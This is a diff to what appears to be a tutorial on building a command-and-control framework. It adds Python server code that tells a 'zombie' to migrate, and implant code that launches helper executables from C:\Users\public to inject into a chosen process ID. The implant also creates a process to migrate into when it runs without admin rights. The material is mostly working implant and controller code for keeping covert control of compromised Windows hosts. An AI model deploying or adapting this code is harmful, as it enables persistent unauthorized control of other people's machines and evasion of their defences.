@@ -212,8 +212,57 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     return TRUE;
 }
 ```
-
 - Next, open and compile the `migrator.sln` and `migrator2.sln` projects and move the compiled executables into the `c:\users\public` directory 😺
+
+
+> **Server side code**
+
+```python
+if choice == "migrate":
+            try:
+                print("What's the process ID of the target process you'd like to migrate into?")
+                print("(If in a non-admin shell, just enter any number to proceed)")
+                procID = input(":")
+                print("procID: ", procID)
+                msg1 = f":migrate:{procID}\n" 
+                clientlist[selection][1].send(msg1.encode('utf-8'))
+                #print(Fore.GREEN + "[+] Initiating migration process now!" + Fore.WHITE)
+                migrationstatus=clientlist[selection][1].recv(1024)
+                migrationstatus = migrationstatus.decode('UTF-8')
+                print(migrationstatus)
+                if "newly" in migrationstatus:
+                    return
+                migrationstatus=clientlist[selection][1].recv(1024)
+                migrationstatus = migrationstatus.decode('UTF-8')
+                print(migrationstatus)
+                time.sleep(4)
+            except:
+                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
+                time.sleep(2)
+```
+
+> **Client / Implant code**
+
+```python
+if ":migrate:" in data:
+            try:
+                if str(shell.IsUserAnAdmin()) == "False":
+                    client.send(b"You're not running in an elevated shell so we can't migrate into an existing process.  Creating a process for you to migrate into.  If all goes well you should have a shell soon in the newly created process!\n")
+                    proc = subprocess.Popen("C:/Users/public/migrator.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                client.send(b"Initiating migration now!\n")
+                procID = data.split(":")
+                procID = procID[2]
+                print("received procID: ", procID)
+                proc = subprocess.Popen(["C:/Users/public/migrator2.exe", procID],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE)
+                client.send(b"returned output: \n"+proc.stdout.read()+proc.stderr.read())
+                #client.send(b"[+] Sleeping for 7 seconds and wrapping things up!  You should be migrated into another process now!\n")
+                time.sleep(7)
+            except:
+                print("some error occurred...")
+```
 
 Okay, I think that should do it!  Let's go ahead and navigate into an elevated session in our Zombie list and then check out our commands.  We're going to want to use the `migrate` command:
 
